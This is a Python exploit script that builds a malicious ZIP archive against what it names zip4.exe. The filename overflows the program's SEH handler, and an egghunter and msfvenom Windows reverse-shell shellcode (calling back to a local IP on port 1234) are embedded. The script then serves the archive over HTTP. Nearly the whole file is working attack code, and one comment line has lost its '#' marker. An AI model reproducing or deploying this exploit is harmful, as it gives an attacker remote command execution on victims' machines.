#!/usr/bin/python3

import struct
import socketserver
import subprocess
import http.server


def create_file(offset):
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.255.130 LPORT=1234 -f python -b "\x00\x2f\x3a\x5c"
    buf =  b"w00tw00t"
    buf += b"\xbd\x7f\xb9\x49\x1c\xdb\xcf\xd9\x74\x24\xf4\x5a\x33"
    buf += b"\xc9\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\xbd\xbd\xab"
    buf += b"\xe9\xbd\x56\xa9\x12\x3d\xa7\xce\x9b\xd8\x96\xce\xf8"
    buf += b"\xa9\x89\xfe\x8b\xff\x25\x74\xd9\xeb\xbe\xf8\xf6\x1c"
    buf += b"\x76\xb6\x20\x13\x87\xeb\x11\x32\x0b\xf6\x45\x94\x32"
    buf += b"\x39\x98\xd5\x73\x24\x51\x87\x2c\x22\xc4\x37\x58\x7e"
    buf += b"\xd5\xbc\x12\x6e\x5d\x21\xe2\x91\x4c\xf4\x78\xc8\x4e"
    buf += b"\xf7\xad\x60\xc7\xef\xb2\x4d\x91\x84\x01\x39\x20\x4c"
    buf += b"\x58\xc2\x8f\xb1\x54\x31\xd1\xf6\x53\xaa\xa4\x0e\xa0"
    buf += b"\x57\xbf\xd5\xda\x83\x4a\xcd\x7d\x47\xec\x29\x7f\x84"
    buf += b"\x6b\xba\x73\x61\xff\xe4\x97\x74\x2c\x9f\xac\xfd\xd3"
    buf += b"\x4f\x25\x45\xf0\x4b\x6d\x1d\x99\xca\xcb\xf0\xa6\x0c"
    buf += b"\xb4\xad\x02\x47\x59\xb9\x3e\x0a\x36\x0e\x73\xb4\xc6"
    buf += b"\x18\x04\xc7\xf4\x87\xbe\x4f\xb5\x40\x19\x88\xba\x7a"
    buf += b"\xdd\x06\x45\x85\x1e\x0f\x82\xd1\x4e\x27\x23\x5a\x05"
    buf += b"\xb7\xcc\x8f\x8a\xe7\x62\x60\x6b\x57\xc3\xd0\x03\xbd"
    buf += b"\xcc\x0f\x33\xbe\x06\x38\xde\x45\xc1\x87\xb7\xba\x93"
    buf += b"\x60\xca\x44\x90\xa2\x43\xa2\xf2\x52\x02\x7d\x6b\xca"
    buf += b"\x0f\xf5\x0a\x13\x9a\x70\x0c\x9f\x29\x85\xc3\x68\x47"
    buf += b"\x95\xb4\x98\x12\xc7\x13\xa6\x88\x6f\xff\x35\x57\x6f"
    buf += b"\x76\x26\xc0\x38\xdf\x98\x19\xac\xcd\x83\xb3\xd2\x0f"
    buf += b"\x55\xfb\x56\xd4\xa6\x02\x57\x99\x93\x20\x47\x67\x1b"
    buf += b"\x6d\x33\x37\x4a\x3b\xed\xf1\x24\x8d\x47\xa8\x9b\x47"
    buf += b"\x0f\x2d\xd0\x57\x49\x32\x3d\x2e\xb5\x83\xe8\x77\xca"
    buf += b"\x2c\x7d\x70\xb3\x50\x1d\x7f\x6e\xd1\x2d\xca\x32\x70"
    buf += b"\xa6\x93\xa7\xc0\xab\x23\x12\x06\xd2\xa7\x96\xf7\x21"
    buf += b"\xb7\xd3\xf2\x6e\x7f\x08\x8f\xff\xea\x2e\x3c\xff\x3e"
    jmpback = b"\x54\x58\x2d\x7f\x7f\x7f\x7f\x2d\x70\x70\x7f\x7f\x2d\x0d\x0a\x01\x01\x98\x85"
    # echo -ne "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf
    # \x75\xea\xaf\x75\xe7\xff\xe7" | msfvenom -a x86 --platform Windows -f python -b "\x00\x2f\x3a\x5c" -e x86/alpha_mixed -v egghunter BufferRegister=EAX
    egghunter =  b""
    egghunter += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    egghunter += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
    egghunter += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
    egghunter += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
    egghunter += b"\x42\x75\x4a\x49\x32\x46\x6e\x61\x38\x4a\x59\x6f"
    egghunter += b"\x44\x4f\x70\x42\x52\x72\x43\x5a\x53\x32\x70\x58"
    egghunter += b"\x68\x4d\x34\x6e\x75\x6c\x35\x55\x30\x5a\x31\x64"
    egghunter += b"\x6a\x4f\x38\x38\x74\x37\x70\x30\x74\x70\x44\x34"
    egghunter += b"\x4e\x6b\x5a\x5a\x6c\x6f\x50\x75\x5a\x4a\x6c\x6f"
    egghunter += b"\x32\x55\x68\x67\x4b\x4f\x7a\x47\x41\x41"
    # pop pop ret at 0x00451845 in zip4.exe
    seh = struct.pack("<I", 0x00451845)
    NSEH jumps back to realign EAX
    nseh = b"\x41\x77\x9f\x41"
    # Egghunter placed after NULLs at 266 bytes into the buffer
    filename = b"A"*266 + egghunter + b"A"*(offset - len(egghunter) - 266 - len(jmpback)) + jmpback+ nseh + seh + buf + b"D"*(4000 - offset - 8 - len(buf))
    print("String length: " + str(len(filename)) + " bytes")
    print("Pre-seh length: " + str(len(b"A"*266 + egghunter + b"A"*(offset - len(egghunter) - 266 - len(jmpback)) + jmpback)) + " bytes")
    filename = filename.strip() + b".txt"
    local_file_header = b"\x50\x4b\x03\x04" # Local File signature
    local_file_header += b"\x14\x00" # minimum version needed to extract
    local_file_header += b"\x00\x00" # General purpose bit flag
    local_file_header += b"\x00\x00" # Compression method
    local_file_header += b"\xb7\xac" # File last modification time
    local_file_header += b"\xce\x34" # File last modification date
    local_file_header += b"\x00\x00\x00\x00" # CRC-32
    local_file_header += b"\x00\x00\x00\x00" # Compressed size
    local_file_header += b"\x00\x00\x00\x00" # Uncompressed size
    local_file_header += b"\x00\x0f" # File name length
    local_file_header += b"\x00\x00" # Extra field length
    local_file_header += filename # File name
    local_file_header += b"" # Extra field

    data = ""
    # data_descriptor is only used when the CRC isn't known when the file is generated
    data_descriptor = b"\x50\x4b\x07\x08" # Optional data descriptor signature
    data_descriptor += b"\x00\x00\x00\x00" # CRC-32
    data_descriptor += b"\x00\x00\x00\x00" # Compressed size
    data_descriptor += b"\x00\x00\x00\x00" # Uncompressed size
    
    central_file_directory_header = b"\x50\x4b\x01\x02" # Central directory file header signature
    central_file_directory_header += b"\x14\x00" # version made by
    central_file_directory_header += b"\x14\x00" # minimum version needed to extract
    central_file_directory_header += b"\x00\x00" # general purpose bit flag
    central_file_directory_header += b"\x00\x00" # Compression method
    central_file_directory_header += b"\xb7\xac" # File last modification time
    central_file_directory_header += b"\xce\x34" # File last modification date
    central_file_directory_header += b"\x00\x00\x00\x00" # CRC-32
    central_file_directory_header += b"\x00\x00\x00\x00" # Compressed size
    central_file_directory_header += b"\x00\x00\x00\x00" # Uncompressed size
    central_file_directory_header += b"\x00\x0f" # File name length
    central_file_directory_header += b"\x00\x00" # Extra field length
    central_file_directory_header += b"\x00\x00" # File comment length
    central_file_directory_header += b"\x00\x00" # Disk number where file starts
    central_file_directory_header += b"\x00\x00" # Internal file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # External file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # Relative offset of local file header
    central_file_directory_header += filename # File name
    central_file_directory_header += b"" # Extra field
    central_file_directory_header += b"" # File comment
    
    # eocd = end of central directory record
    eocd = b"\x50\x4b\x05\x06" # eocd signature
    eocd += b"\x00\x00" # number of this disk
    eocd += b"\x00\x00" # disk where central directory starts
    eocd += b"\x01\x00" # Number of central directory records on this disk
    eocd += b"\x01\x00" # total number of central directory records
    eocd += b"\x12\x10\x00\x00" # Size of central directory
    eocd += b"\x02\x10\x00\x00" # Offset of start of central directory relative to start of archive
    eocd += b"\x00\x00" # Comment length
    eocd += b"" # Comment

    attack = local_file_header + central_file_directory_header + eocd

    file = open("test1.zip", "wb")
    file.write(attack)
    file.close()

def serve_directory():
    port = 8000 
    ip = "192.168.255.130"
    httpServer = socketserver.TCPServer((ip, port), http.server.SimpleHTTPRequestHandler)
    print("[+] Starting HTTP Server on " + ip + " port " + str(port))
    httpServer.serve_forever()

def main():
    offset = 1022
    create_file(offset)
    serve_directory()

if __name__ == "__main__":
    main()
